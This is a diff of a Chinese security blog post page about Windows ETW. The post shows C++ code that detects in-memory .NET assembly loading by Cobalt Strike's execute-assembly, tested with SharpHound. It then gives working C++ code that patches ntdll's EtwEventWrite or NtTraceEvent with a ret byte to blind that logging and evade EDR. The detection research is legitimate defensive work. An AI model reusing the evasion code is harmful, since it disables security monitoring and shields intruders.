class="keyword">long</span> idx[<span class="number">1</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	<span class="built_in">SafeArrayPutElement</span>(args, idx, &amp;vPsa);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">HRESULT hr = pMethodInfo-&gt;<span class="built_in">Invoke_3</span>(vObj, args, &amp;vRet);</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/images/ETW/image-20220512211127018.png" alt="image-20220512211127018"></p>
+<p><img src="/images/ETW/image-20220512211108513.png" alt="image-20220512211108513"></p>
+<h1 id="检测execute-assembly"><a href="#检测execute-assembly" class="headerlink" title="检测execute-assembly"></a>检测execute-assembly</h1><p>一般检测<code>execute-assembly</code>都会使用windows事件跟踪，即<code>ETW</code>，例如这里启动一个<code>powershell</code>进程，通过<code>procexp</code>查看可以看到被<code>CLR</code>托管的dll</p>
+<p><img src="/images/ETW/image-20220512214614676.png" alt="image-20220512214614676"></p>
+<p><img src="/images/ETW/image-20220513125227900.png" alt="image-20220513125227900"></p>
+<p>我们可以从<code>processhacker</code>工具源码里面的<a target="_blank" rel="noopener" href="https://github.com/processhacker/processhacker/blob/master/plugins/DotNetTools/asmpage.c">asmpage.c</a>源码里面查看这类工具是怎样枚举<code>.net</code>工具集的，这里挑出关键代码编译成<code>etw2.exe</code></p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> GUID ClrRuntimeProviderGuid = &#123; <span class="number">0xe13c0d23</span>, <span class="number">0xccbc</span>, <span class="number">0x4e12</span>, &#123; <span class="number">0x93</span>, <span class="number">0x1b</span>, <span class="number">0xd9</span>, <span class="number">0xcc</span>, <span class="number">0x2e</span>, <span class="number">0xee</span>, <span class="number">0x27</span>, <span class="number">0xe4</span> &#125; &#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> name[] = <span class="string">&quot;dotnet trace\0&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> pack(1)</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">AssemblyLoadUnloadRundown_V1</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    ULONG64 AssemblyID;</span><br><span class="line">    ULONG64 AppDomainID;</span><br><span class="line">    ULONG64 BindingID;</span><br><span class="line">    ULONG AssemblyFlags;</span><br><span class="line">    WCHAR FullyQualifiedAssemblyName[<span class="number">1</span>];</span><br><span class="line">&#125; AssemblyLoadUnloadRundown_V1, * PAssemblyLoadUnloadRundown_V1;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> pack()</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> NTAPI <span class="title">ProcessEvent</span><span class="params">(PEVENT_RECORD EventRecord)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    PEVENT_HEADER eventHeader = &amp;EventRecord-&gt;EventHeader;</span><br><span class="line">    PEVENT_DESCRIPTOR eventDescriptor = &amp;eventHeader-&gt;EventDescriptor;</span><br><span class="line">    AssemblyLoadUnloadRundown_V1* assemblyUserData;</span><br><span class="line"></span><br><span class="line">    <span class="built_in"><span class="keyword">switch</span></span> (eventDescriptor-&gt;Id) &#123;</span><br><span class="line">    <span class="keyword">case</span> AssemblyDCStart_V1:</span><br><span class="line">        assemblyUserData = (AssemblyLoadUnloadRundown_V1*)EventRecord-&gt;UserData;</span><br><span class="line">        <span class="built_in">wprintf</span>(<span class="string">L&quot;[%d] - Assembly: %s\n&quot;</span>, eventHeader-&gt;ProcessId, assemblyUserData-&gt;FullyQualifiedAssemblyName);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    TRACEHANDLE hTrace = <span class="number">0</span>;</span><br><span class="line">    ULONG result, bufferSize;</span><br><span class="line">    EVENT_TRACE_LOGFILEA trace;</span><br><span class="line">    EVENT_TRACE_PROPERTIES* traceProp;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;.net_ETW_finder\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(&amp;trace, <span class="number">0</span>, <span class="built_in"><span class="keyword">sizeof</span></span>(EVENT_TRACE_LOGFILEA));</span><br><span class="line">    trace.ProcessTraceMode = PROCESS_TRACE_MODE_REAL_TIME | PROCESS_TRACE_MODE_EVENT_RECORD;</span><br><span class="line">    trace.LoggerName = (LPSTR)name;</span><br><span class="line">    trace.EventRecordCallback = (PEVENT_RECORD_CALLBACK)ProcessEvent;</span><br><span class="line"></span><br><span class="line">    bufferSize = <span class="built_in"><span class="keyword">sizeof</span></span>(EVENT_TRACE_PROPERTIES) + <span class="built_in"><span class="keyword">sizeof</span></span>(name) + <span class="built_in"><span class="keyword">sizeof</span></span>(WCHAR);</span><br><span class="line"></span><br><span class="line">    traceProp = (EVENT_TRACE_PROPERTIES*)<span class="built_in">LocalAlloc</span>(LPTR, bufferSize);</span><br><span class="line">    traceProp-&gt;Wnode.BufferSize = bufferSize;</span><br><span class="line">    traceProp-&gt;Wnode.ClientContext = <span class="number">2</span>;</span><br><span class="line">    traceProp-&gt;Wnode.Flags = WNODE_FLAG_TRACED_GUID;</span><br><span class="line">    traceProp-&gt;LogFileMode = EVENT_TRACE_REAL_TIME_MODE | EVENT_TRACE_USE_PAGED_MEMORY;</span><br><span class="line">    traceProp-&gt;LogFileNameOffset = <span class="number">0</span>;</span><br><span class="line">    traceProp-&gt;LoggerNameOffset = <span class="built_in"><span class="keyword">sizeof</span></span>(EVENT_TRACE_PROPERTIES);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((result = <span class="built_in">StartTraceA</span>(&amp;hTrace, (LPCSTR)name, traceProp)) != ERROR_SUCCESS) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[!] Error starting trace: %d\n&quot;</span>, result);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((result = <span class="built_in">EnableTraceEx</span>(</span><br><span class="line">        &amp;ClrRuntimeProviderGuid,</span><br><span class="line">        <span class="literal">NULL</span>,</span><br><span class="line">        hTrace,</span><br><span class="line">        <span class="number">1</span>,</span><br><span class="line">        TRACE_LEVEL_VERBOSE,</span><br><span class="line">        <span class="number">0x8</span>, <span class="comment">// LoaderKeyword</span></span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        <span class="literal">NULL</span></span><br><span class="line">    )) != ERROR_SUCCESS) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[!] Error EnableTraceEx\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    hTrace = <span class="built_in">OpenTrace</span>(&amp;trace);</span><br><span class="line">    <span class="keyword">if</span> (hTrace == INVALID_PROCESSTRACE_HANDLE) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[!] Error OpenTrace\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">3</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    result = <span class="built_in">ProcessTrace</span>(&amp;hTrace, <span class="number">1</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">if</span> (result != ERROR_SUCCESS) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[!] Error ProcessTrace\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">4</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>首先cs上线</p>
+<p><img src="/images/ETW/image-20220512212858818.png" alt="image-20220512212858818"></p>
+<p>然后启动我们的监控程序</p>
+<p><img src="/images/ETW/image-20220512215550869.png" alt="image-20220512215550869"></p>
+<p>在beacon里面调用<code>SharpHound.exe</code>，这里需要在域内且具有<code>.net</code>环境才能够运行成功，执行以下命令</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">execute-assembly D:\Bloodhound\SharpHound.exe <span class="number">1.2</span><span class="number">.3</span><span class="number">.4</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/images/ETW/image-20220512215639441.png" alt="image-20220512215639441"></p>
+<p>这里就会在exe存放的位置生成以下三个文件</p>
+<p><img src="/images/ETW/image-20220512220715962.png" alt="image-20220512220715962"></p>
+<p>然后我们去看一下我们的监控程序，可以看到已经识别出了<code>SharpHound</code>的调用</p>
+<p><img src="/images/ETW/image-20220512215704961.png" alt="image-20220512215704961"></p>
+<p>这里如果想要规避检测，可以更改程序名的名字，但是这里只要修改检测方法为显示可疑方法的名称即可</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in"><span class="keyword">switch</span></span> (eventDescriptor-&gt;Id) &#123;</span><br><span class="line">  <span class="keyword">case</span> MethodLoadVerbose_V1:</span><br><span class="line">    methodUserData = (struct _MethodLoadVerbose_V1*)EventRecord-&gt;UserData;</span><br><span class="line">    WCHAR* MethodNameSpace = methodUserData-&gt;MethodNameSpace;</span><br><span class="line">    WCHAR* MethodName = (WCHAR*)(((<span class="keyword">char</span>*)methodUserData-&gt;MethodNameSpace) + (<span class="built_in">lstrlenW</span>(methodUserData-&gt;MethodNameSpace) * <span class="number">2</span>) + <span class="number">2</span>);</span><br><span class="line">    WCHAR* MethodSignature = (WCHAR*)(((<span class="keyword">char</span>*)MethodName) + (<span class="built_in">lstrlenW</span>(MethodName) * <span class="number">2</span>) + <span class="number">2</span>);</span><br><span class="line">    <span class="built_in">wprintf</span>(<span class="string">L&quot;[%d] - MethodNameSpace: %s\n&quot;</span>, eventHeader-&gt;ProcessId, methodUserData-&gt;MethodNameSpace);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>这里通过<code>select-string</code>查找<code>SharpHound</code>方法</p>
+<p><img src="/images/ETW/image-20220512213010406.png" alt="image-20220512213010406"></p>
+<p>这里还是启动一下我们的<code>SharpHound</code>程序</p>
+<p><img src="/images/ETW/image-20220512213027871.png" alt="image-20220512213027871"></p>
+<p><img src="/images/ETW/image-20220512213036239.png" alt="image-20220512213036239"></p>
+<p>可以看到还是被监控到了<code>Sharphound2.Sharphound</code>方法</p>
+<p><img src="/images/ETW/image-20220512213114820.png" alt="image-20220512213114820"></p>
+<h1 id="规避ETW检测"><a href="#规避ETW检测" class="headerlink" title="规避ETW检测"></a>规避ETW检测</h1><p>通过查阅资料后发现<code>ETW</code>将 <code>TRUE </code>布尔参数传递到<code>nt!EtwpStopTrace</code>函数中，以查找 <code>ETW </code>特定结构并动态修改或修补<code>ntdll!ETWEventWrite</code>或<code>advapi32!EventWrite</code>立即返回从而停止用户模式记录器</p>
+<p>也就是说在3环<code>ETW</code>是通过<code>ntdll.dll</code>的<code>EtwEventWriteFull</code>函数实现的</p>
+<p><img src="/images/ETW/image-20220512222805809.png" alt="image-20220512222805809"></p>
+<p>往下跟发现调用了<code>EtwEventWriteFull</code>，然后<code>EtwEventWriteFull</code>调用<code>EtwpEventWriteFull</code></p>
+<p><img src="/images/ETW/image-20220512223054442.png" alt="image-20220512223054442"></p>
+<p>我们继续往下看<code>EtwEventWriteFull</code>函数，调用了<code>NtTraceEvent</code></p>
+<p><img src="/images/ETW/image-20220512223238120.png" alt="image-20220512223238120"></p>
+<p>继续跟<code>NtTraceEvent</code>，可以发现<code>NtTraceEvent</code>通过<code>syscall</code>进入内核</p>
+<p><img src="/images/ETW/image-20220512223402930.png" alt="image-20220512223402930"></p>
+<p>这里我们可以打印一下地址</p>
+<p><img src="/images/ETW/image-20220513122021737.png" alt="image-20220513122021737"></p>
+<p>那么我们在<code>EtwEventWriteFull</code>直接使用<code>0xc3</code>即<code>ret</code>返回，即可达到绕过的效果，首先我们通过<code>x64dbg</code>和powershell验证一下</p>
+<p>首先使用x64dbg创建一个powershell进程，这时x64dbg会在线程初始化前下一个断点</p>
+<p>定位到<code>ntdll!EtwEventWrite</code></p>
+<p><img src="/images/ETW/image-20220512223941657.png" alt="image-20220512223941657"></p>
+<p><img src="/images/ETW/image-20220512223957730.png" alt="image-20220512223957730"></p>
+<p>一般windows api默认使用<code>stdcall</code>(x86)调用约定，这里x64默认使用<code>fastcall</code>，即寄存器传参，被调用者清理堆栈，所以我们直接使用<code>ret</code>即<code>C3</code>返回即可</p>
+<p><img src="/images/ETW/image-20220512224033566.png" alt="image-20220512224033566"></p>
+<p>查看<code>CLR</code>日志已经被清空</p>
+<p><img src="/images/ETW/image-20220512224950161.png" alt="image-20220512224950161"></p>
+<p>这里通过代码实现，定位到<code>ntdll!EtwEventWrite</code>函数，然后在入口处<code>ret</code>返回即可，使用<code>VirtualProtectEx</code>修改属性</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">bypassetw</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	STARTUPINFOA si = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	PROCESS_INFORMATION pi = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	si.cb = <span class="built_in"><span class="keyword">sizeof</span></span>(si);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">CreateProcessA</span>(<span class="literal">NULL</span>, (LPSTR)<span class="string">&quot;powershell -NoExit&quot;</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, CREATE_SUSPENDED, <span class="literal">NULL</span>, <span class="literal">NULL</span>, &amp;si, &amp;pi);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> pEtwEventWrite[] = &#123; <span class="string">&#x27;E&#x27;</span>,<span class="string">&#x27;t&#x27;</span>,<span class="string">&#x27;w&#x27;</span>,<span class="string">&#x27;E&#x27;</span>,<span class="string">&#x27;v&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;n&#x27;</span>,<span class="string">&#x27;t&#x27;</span>,<span class="string">&#x27;W&#x27;</span>,<span class="string">&#x27;r&#x27;</span>,<span class="string">&#x27;i&#x27;</span>,<span class="string">&#x27;t&#x27;</span>,<span class="string">&#x27;e&#x27;</span>, <span class="number">0</span> &#125;;</span><br><span class="line">    </span><br><span class="line">	HMODULE hNtdll = <span class="built_in">GetModuleHandleA</span>(<span class="string">&quot;ntdll.dll&quot;</span>);</span><br><span class="line">	LPVOID pEtwEventWrite = <span class="built_in">GetProcAddress</span>(hNtdll, (LPCSTR)pEtwEventWrite);</span><br><span class="line"></span><br><span class="line">	DWORD oldProtect;</span><br><span class="line">	<span class="keyword">char</span> patch = <span class="number">0xc3</span>;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">VirtualProtectEx</span>(pi.hProcess, (LPVOID)pEtwEventWrite, <span class="number">1</span>, PAGE_EXECUTE_READWRITE, &amp;oldProtect);</span><br><span class="line">	<span class="built_in">WriteProcessMemory</span>(pi.hProcess, (LPVOID)pEtwEventWrite, &amp;patch, <span class="built_in"><span class="keyword">sizeof</span></span>(<span class="keyword">char</span>), <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">VirtualProtectEx</span>(pi.hProcess, (LPVOID)pEtwEventWrite, <span class="number">1</span>, oldProtect, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="built_in">ResumeThread</span>(pi.hThread);</span><br><span class="line">	<span class="built_in">CloseHandle</span>(pi.hProcess);</span><br><span class="line">	<span class="built_in">CloseHandle</span>(pi.hThread);</span><br><span class="line">	<span class="built_in">FreeLibrary</span>(hNtdll);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>实现效果如下，可以看到起了一个powershell进程，查看<code>CLR</code>日志也被清空</p>
+<p><img src="/images/ETW/image-20220513104316834.png" alt="image-20220513104316834"></p>
+<p>这里可能某些EDR会hook<code>EtwEventWrite</code>这个函数，那么我们直接往<code>syscall</code>进0环的函数去挂钩，代码如下</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> sNtTraceEvent[] = &#123; <span class="string">&#x27;N&#x27;</span>,<span class="string">&#x27;t&#x27;</span>,<span class="string">&#x27;T&#x27;</span>,<span class="string">&#x27;r&#x27;</span>,<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;c&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;E&#x27;</span>,<span class="string">&#x27;v&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;n&#x27;</span>,<span class="string">&#x27;t&#x27;</span>, <span class="number">0</span>&#125;;</span><br><span class="line">LPVOID pNtTraceEvent = <span class="built_in">GetProcAddress</span>(hNtdll, (LPCSTR)sEtwEventWrite);</span><br></pre></td></tr></table></figure>
+
+
+
+<p>可以看到<code>CLR</code>日志也被清空</p>
+<p><img src="/images/ETW/image-20220513123017709.png" alt="image-20220513123017709"></p>
 
     </article>
     <!-- license -->
     
         <div class="license-wrapper">
             <p>原文作者：<a href="http://Drunkmars.top">Drunkmars</a>
-            <p>原文链接：<a href="http://drunkmars.top/2022/04/16/%E9%9A%90%E8%97%8F%E5%86%85%E5%AD%98/">http://drunkmars.top/2022/04/16/%E9%9A%90%E8%97%8F%E5%86%85%E5%AD%98/</a>
-            <p>发表日期：<a href="http://drunkmars.top/2022/04/16/%E9%9A%90%E8%97%8F%E5%86%85%E5%AD%98/">April 16th 2022, 12:00:00 am</a>
-            <p>更新日期：<a href="http://drunkmars.top/2022/04/16/%E9%9A%90%E8%97%8F%E5%86%85%E5%AD%98/">April 20th 2022, 3:30:48 pm</a>
+            <p>原文链接：<a href="http://drunkmars.top/2022/05/12/ETW/">http://drunkmars.top/2022/05/12/ETW/</a>
+            <p>发表日期：<a href="http://drunkmars.top/2022/05/12/ETW/">五月 12日 2022, 12:00:00 凌晨</a>
+            <p>更新日期：<a href="http://drunkmars.top/2022/05/12/ETW/">May 13th 2022, 4:06:49 pm</a>
             <p>版权声明：本文采用<a rel="license noopener" target="_blank" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
         </div>
     
@@ -763,16 +722,16 @@ printf(&quot;go_write: %p\n&quot;, go_write);
         <li class="next">
             
                 <div class="nextSlogan">Next Post</div>
-                <a href="/2022/05/07/%E6%A3%80%E6%B5%8Bshellcode/" title="对抗无落地的shellcode注入">
-                    <div class="nextTitle">对抗无落地的shellcode注入</div>
+                <a href="/2022/05/14/NtCreateUserProcess/" title="调用NtCreateUserProcess创建进程绕过杀软hook">
+                    <div class="nextTitle">调用NtCreateUserProcess创建进程绕过杀软hook</div>
                 </a>
             
         </li>
         <li class="previous">
             
                 <div class="prevSlogan">Previous Post</div>
-                <a href="/2022/04/13/APIFramework/" title="构建API调用框架绕过杀软hook">
-                    <div class="prevTitle">构建API调用框架绕过杀软hook</div>
+                <a href="/2022/05/07/%E6%A3%80%E6%B5%8Bshellcode/" title="对抗无落地的shellcode注入">
+                    <div class="prevTitle">对抗无落地的shellcode注入</div>
                 </a>
             
         </li>
@@ -918,7 +877,7 @@ printf(&quot;go_write: %p\n&quot;, go_write);
                 <div class="toc-catalog">
                     <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
                 </div>
-                <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="toc-number">1.</span> <span class="toc-text">基础知识</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8"><span class="toc-number">2.</span> <span class="toc-text">系统调用</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF"><span class="toc-number">3.</span> <span class="toc-text">思路</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%AE%9E%E7%8E%B0"><span class="toc-number">4.</span> <span class="toc-text">实现</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#x64%E9%83%A8%E5%88%86"><span class="toc-number">4.1.</span> <span class="toc-text">x64部分</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#x86%E9%83%A8%E5%88%86"><span class="toc-number">4.2.</span> <span class="toc-text">x86部分</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%AE%9E%E7%8E%B0%E6%95%88%E6%9E%9C"><span class="toc-number">5.</span> <span class="toc-text">实现效果</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E9%9A%90%E8%97%8F"><span class="toc-number">5.1.</span> <span class="toc-text">数据隐藏</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8D%E8%B0%83%E8%AF%95"><span class="toc-number">5.2.</span> <span class="toc-text">反调试</span></a></li></ol></li></ol>
+                <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#ETW"><span class="toc-number">1.</span> <span class="toc-text">ETW</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#execute-assembly"><span class="toc-number">2.</span> <span class="toc-text">execute-assembly</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%A1%AC%E7%9B%98%E5%8A%A0%E8%BD%BD"><span class="toc-number">2.1.</span> <span class="toc-text">硬盘加载</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%85%E5%AD%98%E5%8A%A0%E8%BD%BD"><span class="toc-number">2.2.</span> <span class="toc-text">内存加载</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%A3%80%E6%B5%8Bexecute-assembly"><span class="toc-number">3.</span> <span class="toc-text">检测execute-assembly</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%A7%84%E9%81%BFETW%E6%A3%80%E6%B5%8B"><span class="toc-number">4.</span> <span class="toc-text">规避ETW检测</span></a></li></ol>
             </div>
         
         <!-- sidebar -->
@@ -2702,6 +2661,8 @@ printf(&quot;go_write: %p\n&quot;, go_write);
         
         
         
+        
+        
     
     
     
@@ -2730,14 +2691,14 @@ printf(&quot;go_write: %p\n&quot;, go_write);
     
         
         <li class="archive-post-item">
-            <span class="archive-post-date">05/07</span>
-            <a class="archive-post-title" href="/2022/05/07/%E6%A3%80%E6%B5%8Bshellcode/">对抗无落地的shellcode注入</a>
+            <span class="archive-post-date">05/12</span>
+            <a class="archive-post-title" href="/2022/05/12/ETW/">ETW的攻与防</a>
         </li>
     
         
         <li class="archive-post-item">
-            <span class="archive-post-date">04/16</span>
-            <a class="archive-post-title" href="/2022/04/16/%E9%9A%90%E8%97%8F%E5%86%85%E5%AD%98/">通过嵌入x64汇编隐藏数据&反调试</a>
+            <span class="archive-post-date">05/07</span>
+            <a class="archive-post-title" href="/2022/05/07/%E6%A3%80%E6%B5%8Bshellcode/">对抗无落地的shellcode注入</a>
         </li>
     
         
